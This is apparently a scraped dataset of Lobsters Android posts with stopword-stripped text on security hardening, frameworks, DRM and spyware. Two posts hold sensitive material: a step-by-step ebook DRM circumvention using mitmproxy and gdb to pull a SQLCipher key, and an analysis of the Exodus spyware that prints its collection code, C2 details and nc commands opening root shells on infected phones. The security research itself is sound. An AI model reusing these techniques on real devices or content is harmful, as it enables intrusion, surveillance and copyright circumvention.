accelerated codecs software codec process access device driver move two primary source medium vulnerability tightly sandboxed within constrained process software codecs similar extractor extensive code parsing bitstreams untrusted source vulnerability identified source code triggered sending crafted medium file medium apis mediaextractor mediacodec sandboxing two service allows u reduce severity potential security vulnerability without compromising performance addition constraining riskier codecs lot work also gone preventing common type vulnerability bound sanitizer incorrect missing memory bound checking array account android userspace vulnerability case array size known compile time llvm bound sanitizer boundsan automatically instrument array prevent overflow fail safely boundsan instrumentation boundsan enabled medium codecs throughout bluetooth stack android q optimizing away number unnecessary check performance overhead reduced le boundsan already foundprevented potential vulnerability codecs bluetooth integer sanitizer place android pioneered production use sanitizers android nougat first started rolling integer sanization intsan medium framework work continued release successful preventing otherwise exploitable vulnerability example new intsan coverage android pie mitigated critical vulnerability enabling intsan challenging overflow generally benign unsigned integer overflow well defined sometimes intentional quite different bound sanitizer oob readswrites always unintended often exploitable enabling intsan multi year project q fully enabled across medium framework inclusion codecs intsan instrumentation intsan work instrumenting arithmetic operation abort overflow occurs instrumentation impact performance evaluating impact cpu usage necessary case performance impact high identified hot function individually disabled intsan function manually reviewing integer safety boundsan intsan considered strong mitigation applied prevent root cause memory safety vulnerability class mitigation described next target common exploitation technique mitigation considered probabilistic make exploitation difficult limiting vulnerability may used shadow call stack llvm control flow integrity cfi enabled medium framework bluetooth nfc android pie cfi make code reuse attack difficult protecting forwardedges call graph function pointer virtual function android q us llvm shadow call stack sc protect return address protecting backwardsedge control flow graph sc accomplishes storing return address separate shadow stack protected leakage storing location register reserved compiler sc instrumentation sc negligible performance overhead small memory increase due separate stack android q sc turned portion bluetooth stack also available kernel share upcoming post executeonly memory like sc executeonly memory xom aim making common exploitation technique expensive strengthening protection already provided address space layout randomization aslr turn make code reuse attack difficult requiring attacker first leak location code intend reuse often mean attacker need two vulnerability read primitive write primitive previously write primitive necessary order achieve goal xom protects leak memory disclosure code segment making code unreadable attempt read executeonly code result process aborting safely tombstone xom abort starting android q platformprovided code segment binary library loaded executeonly device immediately receive benefit enforcement hardware dependency kernel dependency linux apps targetsdkversion lower q android zygote process relax protection order avoid potential app breakage bit system process example mediaextractor init vold etc protected xom protection applied compiletime memory cpu overhead scudo hardened allocator scudo dynamic heap allocator designed resilient heap related vulnerability useafterfrees quarantining freed block doublefrees tracking chunk state buffer overflow check summing header heap spray layout manipulation improved randomization scudo prevent exploitation rather proactively manages memory way make exploitation difficult configurable perprocess basis depending performance requirement scudo enabled extractor codecs medium framework tombstone scudo abort contributing security improvement open source aosp make use number open source project build secure android google actively contributing back project number security critical area thank ivan lozano kevin deus kostya kortchinsky kostya serebryany mike antares contribution post
102,Lobsters,android,Android,Kotlin is now Google’s preferred language for Android app development,https://android-developers.googleblog.com/2019/05/google-io-2019-empowering-developers-to-build-experiences-on-Android-Play.html,kotlin google preferred language android app development,livestream io extended developer productivity kotlin kotlin kotlineverywhere udacity course android jetpack android jetpack camerax camerax architecture component viewmodel savedstate workmanager navigation jetpack compose jetpack compose android studio android studio lint improvement layout editor improvement emulator improvement build change apply change machine learning android scale ml kit dynamic feature inapp update android app bundle dynamic feature module inapp update user privacy security android q beta storage change part google io session across android io extended event livestream,posted chet haase great backyard google io connect android developer around world attendee shoreline amphitheatre million viewer livestream thousand developer local io extended event across country heard effort make life developer easier today google io talked two big theme helping developer become productive strengthening user privacy security platform let take closer look major developer news io far developer productivity year focused simple idea want save time every today making everything use even better kotlin two year ago announced kotlin supported language android top developer loved already since amazing fast grown professional android developer use kotlin one mostloved language two year running stack overflow one fastestgrowing github number contributor today announcing another big step android development become increasingly kotlinfirst many new jetpack apis feature offered first kotlin starting new project write kotlin code written kotlin often mean much le code code type test maintain continuing invest tooling doc training event make kotlin even easier learn use includes kotlineverywhere new global series event launching jetbrains learn language new udacity course video android jetpack last year announced android jetpack android api accelerate android development make writing highquality apps easy le code top apps already using jetpack continue simplify everyday developer challenge today releasing new jetpack library alpha bringing library beta quality highlight video camerax told u working effectively across range unique android device tough camerax new opensource android jetpack library make camera development easier faster provides consistent camera experience across device longer maintain device specific configuration find support leadingedge hardware software feature like optical zoom bokeh hdr night mode participating manufacturer device work almost device backwards compatible l also easy migration path legacy camera apis work seamlessly apis camera usage android come installed apps device camera app really excited make camera development easier video architecture component made number addition enhancement based feedback told u concurrency android hard bringing livedata lifecycles w coroutines support common oneshot asynchronous operation viewmodel savedstate module eliminate boilerplate code gain benefit using viewmodel savedstate simple apis save retrieve data right viewmodel case missed announced stable release workmanager background processing navigation navigation app screen couple month ago jetpack compose many asking u modern reactive style ui toolkit android take advantage kotlin integrates seamlessly platform existing code today sharing team work jetpack compose jetpack compose designed simplify ui development combining reactive programming model conciseness easeofuse kotlin compatible existing ui toolkit mix match view direct access android jetpack apis also fully declarative defining ui component designed material animation tool mind start starting today developing open find code aosp android studio today releasing android studio beta month team exclusively focused refining polishing daytoday development workflow project marble android studio includes better ide memory management large project lower typing latency lint improvement cpu usage optimization layout editor improvement emulator improvement build change well complete rewrite instant run called apply change reliably accelerates ability see code change device plus high priority bug fix machine learning android scale android q made significant improvement android neural network api nnapi first increased number operator supported vast majority model accelerated nnapi alteration also introduced introspection api advanced user allowing full control hardware component handle acceleration eg dsp v npu worked closely hardware vendor deliver significant improvement performance latency power consumption working mediatek able accelerate ml kit face detection api helio working qualcomm able accelerate google lens ocr snapdragon ai engine increasing speed also reducing power consumption dynamic feature inapp update last year introduced android app bundle help reduce app size increase installs since seen app bundle production average size saving today number announcement help reduce size deliver update user even faster today glad share dynamic feature module moving beta stable dynamic feature module reduce app size even choosing part app deliver based condition like device feature country even deliver module ondemand instead install time today also moving inapp update beta stable ability dynamically update apps something requesting long time let say crucial bug app need push right away want wait user discover update play store user privacy security android q developer community care getting right building platform offer powerful capability developer making sure user safety privacy protected introduced android q beta month ago feature improvement around user privacy security q change provide user transparency control always working hard everything developer adopting new release know feature build q change worked hard minimize impact well incorporate feedback given long notice period possible well complete detailed technical information front make easy possible adopt also want thank community ongoing feedback huge help team working hard get right great example beta storage change feedback helped u evolve feature course beta android longstanding commitment minimizing breaking change commitment unchanged work hard keep android open flexible developer friendly platform love part google io got lot great content store next three day including session across android excited join u inperson shoreline io extended event online livestream constantly investing platform connects developer billion user around world entire android community thank continued support feedback part android
103,Lobsters,android,Android,Bringing Flutter to the Web,https://medium.com/flutter-io/bringing-flutter-to-the-web-904de05f0df0,bringing flutter web,bringing flutter web flutter ambition flutter web browser flutter web architecture flutter desktop effort flutterdevweb,bringing flutter webflutter portable ui framework building beautiful tailored experience support modern web pleased release technical preview sdk let take flutter ui code business logic run directly browserour ambition flutter web browserssince first beta last year customer using flutter create mobile apps run io android however flutter always architected portable ui toolkit among place run window mac fuchsia even raspberry pi since flutter built using dart includes productionquality compiler native machine code javascript solid foundation remaining challenge replace skiabased graphic engine text renderer webplatform equivalentsto right needed deliver fast jankfree framespersecond performance interactive graphicsconsistent behavior visuals flutter platformshighproductivity developer tooling integrates existing development patternssupport core web feature across modern browserswhile flutter web work progress plenty work area ready share preview try give u feedbackflutter web architecturethe overall architecture flutter web closely resembles flutter mobile flutter web architecturethe flutter framework green diagram shared mobile web offering provides highlevel abstraction ui foundation flutter including animation gesture base widget class well materialthemed set widget common application need already building flutter feel immediately home flutter webthe magic come translating concept browser reimplemented dart ui library replacing binding skia engine used mobile code target dom canvas compile flutter code web application flutter framework webflavored dart ui library written dart compiled javascript run modern browserflutter web demo running chrome firefox safariwe thoughtfully embracing core web feature like seamless integration browser history flutter routing model also coordinating flutter desktop effort enable mouse scrolling hover focus feature required mobile experiencesthe flutter web project focusing core value provided framework rich interactive experience web content focused document still benefit embedding flutter web visualizationsthe preview framework exists temporary fork existing flutter framework allowed engineer move quickly implement web functionality letting core team continue maintain improve productionready toolset already begun merge browser support main repository plan provide one flutter toolkit one framework power mobile web platformsour planned work includes support text feature selection copypastesupport plugins feature like location camera file access hope bridge mobile web single apioutofthebox support technology like progressive web appsunifying web development tooling existing flutter cli ide integrationdebugging web application using devtoolsimproved performance browser support accessibilitygo flutterdevweb find example documentation link resource excited see build
104,Lobsters,android,Android,"flow9: a cross-platform modern UI for Web, iOS, Android, Windows, Mac, Linux",https://flow9.org/,crossplatform modern ui web io android window mac linux,welcome flow name blog flow github,welcome flow flow platform safe easy productive programming complex multiplatform apps modern user interface flow platform includes flow programming language safe functional stronglytyped programming language flowc compiler incremental compiler multiple target flow runtime standard library provides complete crossplatform library including mature ui component flow production quality target html io android window mac linux name flow started predates flow typechecker facebook thus elect keep name since came first full platform risk confusion seems small however need arise also used refer language blog april released flow github open source flow complete platform writing apps functional programming language run everywhere every day new programming language announced need one
105,Lobsters,android,Android,A Robust Native-Crash-Reporting Library for Android App,https://github.com/iqiyi/xCrash,robust nativecrashreporting library android app,xcrash iqiyi readme 中文版 feature tombstone file preview overview map architecture capture native crash capture anr usage add dependency specify one abi need initialize xcrash srcjavaxcrashxcrashsample build download android ndk set path environment build copy native library build aar library support xcrashsample github issue caikelun gmailcom contributing xcrash contributing guide license license licensedocs,xcrash xcrash provides android app ability capture java crash native crash anr root permission system permission required xcrash generate tombstone file similar format android system tombstone file directory specified app process crash anrs xcrash used many android apps including iqiyi video different platform mobile tablet tv iqiyi many year readme 中文版 feature support android api level support armeabi capturing java crash native crash anr dumping detailed statistic process thread memory fd network setting thread info dumped via regular expression require root permission system permission tombstone file preview overview map architecture capture native crash capture anr usage add dependency dependency implementation comiqiyixcrash specify one abi need android defaultconfig ndk abifilters armeabi initialize xcrash java public class mycustomapplication extends application override protected void attachbasecontext context base superattachbasecontext base xcrashxcrashinit kotlin class mycustomapplication application override fun attachbasecontext base context superattachbasecontext base xcrashxcrashinit tombstone file written context getfilesdir tombstone directory default usually datadatapackagenamefilestombstones practical complex sample app srcjavaxcrashxcrashsample folder build want build xcrash source code follow guide download android ndk set path environment build copy native library cd srcnative buildsh installsh build aar library cd srcjavaxcrash gradlew xcrashlib build support check xcrashsample communicate github issue email caikelun gmailcom qq group qr code contributing see xcrash contributing guide license xcrash mit licensed found license file xcrash documentation creative common licensed found licensedocs file
106,Lobsters,android,Android,The Android Platform Security Model,https://arxiv.org/pdf/1904.05572.pdf,android platform security model,,obj filter flatedecode length stream
107,Lobsters,android,Android,NewPipe represents the best of FOSS,https://drewdevault.com/2019/04/02/NewPipe-represents-the-best-of-FOSS.html,newpipe represents best fo,newpipe christian schabesberger team people,newpipe free opensource android application browsing watching youtube opinion newpipe perfect casestudy free open source software great value differ proprietary software important way one simple reason better proprietary youtube app every conceivable way free newpipe better usercentric software exists make user life better enrich overseer newpipe many feature deliberately omitted proprietary app advertisement playing video background downloading video audio track alone play offline playing video popup player subscribing channel without youtube account importing exporting subscription showing subscription chronological order support streaming service youtube youtube support bit excessive feature support top youtube constantly gathering data making decision put interest ahead whereas newpipe never phone home consistently add new feature put user first proprietary app exploitative user newpipe empowering user lot political philosophical reason use support free open source software sometimes hard get people board fo pitching first newpipe great model straight better better reason make philosophical point obvious poignant newpipe project started christian schabesberger comaintained team contributed people donate newpipe represents best community thanks
108,Lobsters,android,Android,Crossing the Rust FFI frontier with Protocol Buffers,https://hacks.mozilla.org/2019/04/crossing-the-rust-ffi-frontier-with-protocol-buffers/,crossing rust ffi frontier protocol buffer,application service firefox account webpush solving one many target crossplatform strategy using rust solved ffi challenge safely ffisupport foreign function interface must data serialization protocol buffer many data serialization format prost cleanlooking structs look ahead oxidize application service,team application service team mozilla work firefox sync firefox account webpush feature currently shipped firefox desktop android io browser soon available new product upcoming android browser password manager lockbox firefox fire tv solving one many target historical reason functionality implemented widely different fashion tightly coupled product supporting make hard reuse example currently three firefox sync client one javascript one java another one swift considering size team quickly realized current approach shipping product would scale across product would lead quality issue bug uneven featurecompleteness across platformspecific implementation year ago decided plan future may know mozilla making pretty big bet new rust programming language natural u follow suit crossplatform strategy using rust new strategy follows build crossplatforms component implementing core business logic using rust wrapping thin platformnative layer kotlin android swift io biggest obvious advantage get one canonical code base written safe statically typed language deployable every platform every upstream business logic change becomes available product version bump solved ffi challenge safely however one challenge new approach safely passing richlystructured data across api boundary way memorysafe work well rust ownership system wrote ffisupport crate help write code ffi foreign function interface task strongly consider using initial version implemented serializing data structure json string case returning cshaped struct pointer procedure returning say bookmark user synced data looked like returning bookmark data rust kotlin using json simplified problem approach performance json serializing deserializing notoriously slow performance primary design goal format top extra string copy happens java layer since rust string java string scale introduce significant overhead complexity safety every data structure manually parsed deserialized json string data structure field modification rust side must reflected kotlin side exception likely occur even worse case returning json string cshaped rust structs pointer forget update structure kotlin subclass objectivec struct serious memory corruption hand quickly realized probably better faster way could safer current solution data serialization protocol buffer thankfully many data serialization format aim fast one schema language even autogenerate data structure exploration ended settling protocol buffer version safety come automated generation data structure language care one source proto schema data class generated build time rust consumer side protoc protocol buffer code generator emit code language rust side use prost crate output cleanlooking structs leveraging rust derive macro returning bookmark data rust kotlin using protocol buffer simplified course top protocol buffer faster json downside approach work convert internal type generated protobuf structs url url converted string whereas back using serdejson serialization struct implementing serde serialize line away sent ffi barrier also add one step build process although pretty easy integrate one thing ought mention since ship producer consumer binary stream unit freedom change data exchange format transparently without affecting android io consumer look ahead looking forward probably highlevel system could used exchange data ffi maybe based rust macro also talk using flatbuffers squeeze even performance case protobufs provided right tradeoff easeofuse performance relative safety far component present io firefox lockbox lockbox android soon new upcoming android browser firefox io started oxidize replacing password syncing engine one built rust plan eventually firefox desktop well interested helping u build future firefox sync simply following progress head application service github repository
109,Lobsters,android,Android,Investigating a recent ebook DRM system (c. 2018),https://yingtongli.me/blog/2019/03/28/drm2.html,investigating recent ebook drm system c,background last time intercepting ssl request mitmproxy since android n magisktrustusercerts intercepting downloads inspecting application java code jdgui inspecting apk native library xamarinandroid mono android sqlcipher b inspecting symbol libsqlcipherso sqlite sqlcipher api documentation debugging gdb android ndk support library use couple signal internally confuse sqlite documentation arm calling convention documentation putting together,background post concern drm system used online ebook platform released circa user platform purchase ebooks either view online download offline viewing using proprietary androidios app usual particular drm system relevant identified last time clever reader able identify system time made extra challenging intercepting ssl request app downloads ebooks using ssl intercept request need able decrypt android packet capture apps work well used mitmproxy mitmdump set blockglobalfalse set proxy server listening http configuring android use proxy server navigate http mitmit install mitmproxy ssl certificate authority ca even however face additional hurdle custom ca usually installed android credential opposed credential since android n ca longer trusted default unless app explicitly optsin xposed module claim able bypass certificate validation mixed success instead copied ca store magisktrustusercerts intercepting downloads proceed intercepting download opening ebook reader app attempting download book see following request clientconnect streaming response get http ok content missing download file foozip appears simple zip file mb large extract content mkdir foo cd foo unzip foozip archive foozip inflating inflating inflating examining content archive appears contain mostly asset two folder cs image plus large number loose image strewn root directory text sight however suspiciouslylarge file root directory mb large filetype unrecognised file data opening file hex editor reveals random assortment byte apparent order investigation required inspecting application java code obtain copy android app apk file copying dataappcomexampleereaderbaseapk obtaining thirdparty apk website apk file simply another zip file extract compiled java bytecode packaged classesdex file inside apk use convert normal jar file use java decompiler like jdgui decompile looking decompiled source code however seem anything interesting little bit application boilerplate networkingrelated code nothing seems help making sense file inspecting apk native library looking elsewhere apk see number native code library inside assembly folder find number interesting file foobarcommondll foobarcommondllconfig microsoftcsharpdll monoandroiddll etc dll file linuxbased platform file relate xamarinandroid mono android application designed crossplatform development one imago one looked io application would similar file looking instead folder see usuallooking file libmono library libsqlcipherso little googling find libsqlcipherso sqlcipher open source extension sqlite provides transparent aes encryption database aha could sqlite database encrypted inspecting symbol libsqlcipherso usual tool listing symbol file nm objdump little trouble file use readelf successfully inspect content armnoneeabireadelf w libsqlcipherso symbol table dynsym contains entry num value size type bind vi ndx name notype local default und func global default und cxafinalize libc func global default und cxaatexit libc func global default sqlciphercodecpragma func global default func global default func global default android application using library access encrypted database able attach debugger set breakpoints library function intercept encryption parameter sqlite sqlcipher api documentation identify function may interesting debugging gdb prepare attach debugger android application android ndk come prebuilt gdb server binary android push phone start ebook reader app attach debugger adb push optandroidndkprebuiltandroidarmgdbservergdbserver datalocaltmp optandroidndkprebuiltandroidarmgdbservergdbserver file pushed mb byte adb shell jasminesprout su jasminesprout p grep ereader sysepollwait comexampleereader jasminesprout datalocaltmpgdbserver attach attached pid listening port adb forward gnu gdb gdb copyright c free software foundation inc gdb target remote remote debugging using reading remote target warning file transfer remote target slow use set sysroot access file locally instead reading remote target reading symbol target reading symbol gnudebugdata target debugging symbol found done debugging symbol found done reading systembinlinker remote target reading systemliblibandroidruntimeso remote target reading systemliblibbaseso remote target reading systembinlinker remote target epollpwait target systemliblibcso gdb set breakpoints interesting function identified earlier gdb b breakpoint location gdb b breakpoint location gdb b breakpoint location gdb b breakpoint gdb b breakpoint gdb finally support library use couple signal internally confuse need instruct gdb ignore gdb handle sigxcpu sigpwr nostop noprint signal stop print pas program description sigxcpu yes cpu time limit exceeded sigpwr yes power failrestart yes realtime event yes realtime event yes realtime event yes realtime event yes realtime event gdb resume execution tap ebook wait breakpoints triggered gdb cont continuing new thread thread exampleereader hit breakpoint target dataappcomexampleereaderlibarmlibsqlcipherso gdb bingo hit sqlite documentation signature function int const char filename database filename ppdb sqlite db handle int flag flag const char zvfs name vfs module use unfamiliar arm point initially went wild goose chase poking around stack looking argument function like arm calling convention place argument register gdb info reg sp lr pc cpsr fpscr gdb comparing function signature look like could plausibly match expect two pointer filename ppdb bitmask flag flag null pointer zvfs null examining data gdb x gdb yes indeed right place let see find something related encryption gdb cont continuing new thread new thread new thread new thread new thread new thread new thread new thread new thread new thread new thread thread exampleereader hit breakpoint target dataappcomexampleereaderlibarmlibsqlcipherso gdb info reg sp lr pc cpsr fpscr gdb hit function responsible telling sqlcipher encryptiondecryption key database documentation relevant function signature int db database rekeyed const char zdbname name database const void pkey int nkey key mean third argument stored pointer key gdb x correcthorsebatterystapleblahotherrandomwordsherefoobar gdb well certainly one way constructing encryption key placeholder example real key format putting together identified encryption key able access sqlite database using sqlcipher command line tool sqlcipher sqlcipher version sqlite dbinfo unable read database header sqlite pragma keycorrecthorsebatterystapleblahotherrandomwordsherefoobar sqlite pragma ciphermigrate sqlite dbinfo database page size write format read format reserved byte file change counter database page count freelist page count schema cookie schema format default cache size autovacuum top root incremental vacuum text encoding user version application id software version number table number index number trigger number view schema size data version sqlite remains decrypt data plain sqlite database sqlite attach database plaintextdb plaintext key sqlite select sqlcipherexport plaintext sqlite et voilã
110,Lobsters,android,Android,Exodus: New Android Spyware Made in Italy,https://securitywithoutborders.org/blog/2019/03/29/exodus.html,exodus new android spyware made italy,exodus new android spyware made italy mar clicca qui per la versione italiano summary exodus exodus one exodus two apps collected dozen installation one case reaching victim located italy esurv spyware might expose infected device compromise data tampering disguised spyware uploaded google play store multiple copy installs estimate total number infection amount several hundred thousand stage spyware upgraded second stage test device immediately first checkins period several day infected test device never remotely disinfected operator stage dexclassloader lukas stefanko skygofree data collection exfiltration eventually observed agent exfiltrate wifi password test phone command control server accuweather local remote shell infected device connected public wifi network host able obtain terminal identification esurv presence italian language overlapping infrastructure esurv surveillance camera censys shodan esurv publicly advertised product older sample connecting esurv twoletters code bo b c ct fi na rc ct cz fi mi rc bo ct fi fi public resume confirms development android agent indicator compromise exodus one exodus one package name exodus two exodus two elf utility command control,exodus new android spyware made italy mar clicca qui per la versione italiano disclaimer research conducted member associate security without border independently affiliation employer summary identified new android spyware platform named exodus composed two stage call exodus one exodus two collected numerous sample spanning early instance spyware found google play store disguised service application mobile operator google play store page decoy malicious apps italian according publicly available statistic well confirmation google apps collected dozen installation one case reaching victim located italy google play store page taken google believe spyware platform developed italian company called esurv primarily operates business video surveillance according public record appears esurv began also develop intrusion software exodus equipped extensive collection interception capability worryingly modification enforced spyware might expose infected device compromise data tampering disguised spyware uploaded google play store identified previously unknown spyware apps successfully uploaded google play store multiple time course two year apps would remain available play store month would eventually reuploaded detail would vary identified copy spyware shared similar disguise case would crafted appear application distributed unspecified mobile operator italy often app description play store would reference sm message target would supposedly receive leading play store page play store page identified decoy apps written italian according google contacted alert discovery nearly variant spyware uploaded google play store google play removed apps stated thanks enhanced detection model google play protect able better detect future variant application google share u total number infected device confirmed one malicious apps collected installation play store variant collected dozen infection located italy directly observed multiple copy exodus installs estimate total number infection amount several hundred thousand stage exodus one first stage installed downloading malicious apps uploaded google play store act dropper following example decoy used dropper purpose exodus one seems collect basic identifying information device namely imei code phone number send command control server usually done order validate target new infection corroborated older unobfuscated sample whose primary class named checkvalidtarget test spyware upgraded second stage test device immediately first checkins suggests operator command control enforcing validation target additionally period several day infected test device never remotely disinfected operator purpose report analyze exodus one sample hash communicated command control server sample communicated server listed bottom report exodus one checksin sending post request containing app package name device imei encrypted body containing additional device information post useragent itpromofferte redacted contenttype applicationoctetstream contentlength host connection keepalive acceptencoding gzip q nv usr q redacted glo yq w l jk g rxx oz ok server ubuntu date redacted contenttype texthtml transferencoding chunked connection keepalive contentencoding gzip encrypted body composed various identifier joined together stringbuilder stringbuilder new stringbuilder stringbuilderappend stringbuilderappend stringbuilderappend deviceid stringbuilderappend stringbuilderappend str stringbuilderappend stringbuilderappend stringbuilderappend stringbuilderappend subscriberid stringbuilderappend stringbuilderappend networkoperatorname stringbuilderappend stringbuilderappend networktype stringbuilderappend stringbuilderappend simstate dofinal called encrypt device information string final byte dofinal stringbuildertostring getbytes user agent string built package name imei number thisegetpackagename deviceid subscriberid finally http request sent server http many string application xor key stringbuilder new stringbuilder http pa final request build builderurl header useragent subscriberid post create build additional request dropper made post request http returned zip file containing second stage binary post useragent itpromofferte redacted contenttype applicationoctetstream contentlength host connection keepalive acceptencoding gzip f ri sd xt l cc u w redacted k z fcv u ok server ubuntu date redacted contenttype texthtml transferencoding chunked connection keepalive contentencoding gzip pk e l nullarmut dzxdzux f p stage exodus two zip archive returned checkin performed exodus one collection file including primary payload mikejar several compiled utility serve different function least recent version january zip archive would actually contain arm version deployed binary file name modified date nullarm sepolicyinjectarm rootdaemonarm mikejar zygotedaemonarm sappapk placeholder download exodus one would dynamically load execute primary stage payload mikejar using android api dexclassloader mikejar implement data collection exfiltration capability spyware various binary downloaded interesting null serf local reverse shell rootdaemon take care privilege escalation data acquisition rootdaemon first attempt jailbreak device using modified version dirtycow exploit similarly another android spyware made italy originally discovered lukas stefanko later named skygofree analyzed depth kaspersky lab exodus also take advantage protectedapps feature huawei phone allows configure powersaving option running application manipulating sqlite database exodus able keep running even screen go application would otherwise suspended reduce battery consumption funcsqliteloaddb int datadatacomhuaweisystemmanagerdatabasesoptimizedb int dbhandle sprintf insert protectedapps packagename listtype value funcsqliteexec dbhandle sprintf delete backgroundwhiteapps packagename funcsqliteexec dbhandle sprintf insert backgroundwhiteapps packagename value funcsqliteexec dbhandle funcsqlitefree funcsqliteloaddb int int dbhandle sprintf insert protectedapps packagename listtype value funcsqliteexec dbhandle sprintf delete rogueapps pkgname funcsqliteexec dbhandle sprintf delete superpowerapps pkgname funcsqliteexec dbhandle sprintf replace unifiedpowerapps pkgname isprotected isshow ischanged value funcsqliteexec dbhandle funcsqlitefree additionally rootdaemon attempt remove power usage statistic huawei phone systemmanager funcsqliteloaddb int datadatacomhuaweisystemmanagerdatabasesstusagestatdb int dbhandle sprintf replace defaultvaluetable pkgname control protect keytask value funcsqliteexec dbhandle sprintf delete stkeyprocstable stkeyprocess funcsqliteexec dbhandle sprintf insert stkeyprocstable stkeyprocess value funcsqliteexec dbhandle sprintf replace stprotectedpkgstable pkgname ischecked value funcsqliteexec dbhandle funcsqlitefree similarly malicious application probably attempt minimize trace samsung phone adding file datadatacomsamsungandroidsecuritylogagentsharedprefsapmspstatusofappsxml following line xml version standaloneyes map int name app name value map adding file datadatacomsamsungandroidsecuritylogagentsharedprefscomsamsungandroidsecuritylogagentpreferencesxml line instead xml version standaloneyes map boolean name app name value false map data collection exfiltration mentioned mikejar equips spyware extensive collection capability including retrieve list installed application record surroundings using builtin microphone format retrieve browsing history bookmark chrome sbrowser browser shipped samsung phone extract event calendar app extract call log record phone call audio format take picture embedded camera collect information surrounding cellular tower bts extract address book extract contact list facebook app extract log facebook messenger conversation take screenshot app foreground extract information picture gallery extract information th gmail app dump data imo messenger app extract call log contact message skype app retrieve sm message extract message encryption key telegram app dump data viber messenger app extract log whatsapp retrieve medium exchanged whatsapp extract wifi network password extract data wechat app extract current gps coordinate phone acquisition performed purely code mikejar others require access example sqlite database file application storage performed rootdaemon instead running root privilege order achieve mikejar connects rootdaemon various tcp port daemon bind extraction routine supported application port whatsapp extraction service port facebook extraction service port gmail extraction service port skype extraction service port viber extraction service port imo extraction service port telegram extraction service port sbrowser extraction service port calendar extraction service port chrome extraction service service appear running network interface therefore accessible anyone sharing local network infected device tcp listen tcp listen tcp listen tcp listen tcp listen following see example connection port used extract data telegram app able send command service dumpmsgdb getkey dump tgnetdat file user laptop nc xxd getkey af p ya r n mhng c dlpb n e data acquired mikejar extraction module normally xored stored folder named lostfound sd card data eventually exfiltrated tl connection command control server wsmylocalweather com upload queue mentioned test device automatically stage one stage two started collecting data example password wifi network used phone stored folder using following file name format datetime followed imei eventually observed agent exfiltrate wifi password test phone command control server put useragent itpromofferte redacted detail date redacted imei redacted redacted redacted redacted uploadtype wifipassword encrypted true contenttype applicationoctetstream contentlength host wsmylocalweathercom connection keepalive acceptencoding gzip redacted sp ok server nginx date fri jan gmt contenttype texthtml transferencoding chunked connection keepalive contentencoding gzip ok similarly agent also sent command control list installed apps put useragent itpromofferte redacted detail date redacted imei redacted redacted redacted redacted uploadtype applist encrypted true contenttype applicationoctetstream contentlength host wsmylocalweathercom connection keepalive acceptencoding gzip gvergrt q tq uyyr wq redacted wiwr mwepagpxwyr cg dd cxs p u jh ok server nginx date redacted contenttype texthtml transferencoding chunked connection keepalive contentencoding gzip command control seems active since least april registered impersonating legitimate service accuweather registrant name accuweather inc registrant organization accuweather inc registrant street science park rd registrant city state college registrant stateprovince pa registrant postal code registrant country u registrant phone registrant phone ext registrant fax registrant fax ext registrant email accuweather nycmail com local remote shell order execute command infected device well provide reverse shell command control operator exodus two immediately attempt execute payload downloads name null launched null first verify whether able fork system instance currently running checking whether local port number available payload attempt instantiate remote reverse systembinsh shell command control wsmylocalweather com port worth noticing remote reverse shell employ transport cryptography traffic transit clear therefore potentially exposed maninthemiddle attack time null also bind local shell local port used exodus two execute various command android device enabling disabling certain service parsing app database however binding shell available interface obviously make accessible anyone sharing least local network infected device example infected device connected public wifi network host able obtain terminal device without form authentication verification simply connecting port user laptop nc v connection port tcp succeeded hammerhead id id sdcardrw sdcardr inet contextu r untrustedapp mobile operator nt enforce proper client isolation possible infected device also exposed rest cellular network obviously inevitably leaf device open compromise data tampering well null payload opening shell phone rootdaemon binary fact offer several possibility execute command infected device connecting tcp port issuing one following command sending command sh tcp port result full terminal dropped user laptop nc sh system hammerhead id id system system sdcardrw sdcardr shell inet contextu r system system hammerhead sending command cmd followed proper terminal command execute print output example use id display identity system user running issued command user laptop nc cmd id system system sdcardrw sdcardr shell inet contextu r system command sucmd run terminal command root nc sucmd id root root sdcardrw sdcardr shell inet contextu r system command supported rootdaemon tcp port su test nt properly work loadsocketpolicy loadfilepolicy remount removeroot cost possibly overly verbose following output nmap scan infected android device laptop local network demonstrantes availability open tcp port mentioned thus far user laptop nmap starting nmap http nmaporg cet nmap scan report android redacted host latency shown closed port port state service open lmx open thermocalc open unknown open qmtps open unknown open unknown open netmohttp nmap done ip address host scanned second identification esurv presence italian language first look first sample spyware obtained show immediately evident connection company however persistent presence italian language google play store page well inside spyware code clear sign italian actor behind creation platform initially particular word decompiled classesdex exodus two sent u right direction mundizza false thisbinfo uploadservice aggiunti file mundizza dimensione coda upload integervalueof thiscsize mundizza dialectal word derivative proper italian word immondizia translates trash garbage english interestingly mundizza typical calabria region south italy specifically appears language native city catanzaro additionally copy exodus one use following xor key char carr new char r n g u rino gattuso famous retired italian footballer originally calabria seriously element made u restrict research surveillance company region overlapping infrastructure esurv surveillance camera command control domain configured several malicious application found google play store wsmylocalweather com point ip address serf selfsigned tl certificate certificate common name mycert fingerprint ce ae ac search certificate fingerprint internet scanning service censys return additional server ip address opening command control web page browser present basic authentication prompt closing prompt cause server send unauthorized response access denied message italian ip address discovered sharing tl certificate behave way command control server also display favicon image look like small orange ball time writing reverse image search favicon shodan using query returned around web server use favicon many server control panel video surveillance system developed italian company esurv based catanzaro calabria italy publicly advertised product include cctv management system surveillance drone face license plate recognition system esurv logo identical command control server favicon older sample connecting esurv finally google shared u older sample exodus one hash obfuscated use following disguise configuration older sample similar newer one provides additional insight obfuscated package comvendmanagementcarriermylibrary public class configuration public static final string bundlecustomfilename public static final string bundleuniversalfilename public static final string public static final string exploitarm public static final string public static final string hostdirectory public static final string hostip attivaexodusesurvit public static final string public static final string public static final string hostwsinit public static final string public static final string placeholderafterfirstexecution public static final string unzippedfolder firstly notice instead generic domain name ip address sample communicated command control server located attivaexodusesurv attiva italian activate public static final string hostip attivaexodusesurvit named spyware exodus command control domain name following snippet code older exodus one sample showing connection command control final byte encryptedbytes steponecipher dofinal imei versione telefono getbytes final request request new requestbuilder url http post requestbodycreate mtype encryptedbytes build almost identical composition request command control server mikejar also containing path barr null barr lc dofinal deviceid getbytes response execute buildnewcall new requestbuilder url http wsmylocalweather php post requestbodycreate barr build execute corroborate connection exodus spyware esurv domain attivaexodusesurvit resolve ip according public passive dns data used host domain connexxa company also catanzaro according publicly available information founder connexxa seems also ceo esurv interestingly found dns record mostly follow similar pattern appear contain twoletters code district italy server city bologna brescia cosenza catania firenze napoli reggio calabria catania catanzaro firenze milano reggio calabria bologna catania firenze firenze serverrtexodusconnexxa public resume confirms development android agent additionally employee esurv quite precisely described work developing agent gather data android device send c c server well researching vulnerability mobile device mainly android publicly available resume detail reflect characteristic exodus bypass power manager described exodus one indicator compromise exodus one exodus one package name comphonecarrierlinecheck rmrf 